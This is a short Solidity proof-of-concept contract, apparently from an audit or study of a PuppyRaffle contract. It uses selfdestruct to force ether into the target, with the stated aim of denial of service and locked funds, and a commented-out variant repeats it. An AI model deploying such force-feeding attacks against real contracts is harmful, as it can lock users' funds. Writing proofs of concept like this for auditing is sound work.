// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Attacker_Self_Destruct {
    address public owner;
    PuppyRaffle puppyraffle;

    constructor(PuppyRaffle _puppyraffle) payable {
        puppyraffle = PuppyRaffle(_puppyraffle); // Initialize the puppyraffle contract
    }

    //Causing Denial of Service and funds locked
    function attack() external {
        address payable addr = payable(address(puppyraffle));
        selfdestruct(addr);
    }
}


// pragma solidity ^0.7.6;

// import "./PuppyRaffle.sol";

// contract Attacker_Self_Destruct {

//     //Causing Denial of Service and funds locked
//     function attack(address payable _to) external payable{
//         selfdestruct(_to);
//     }
// }
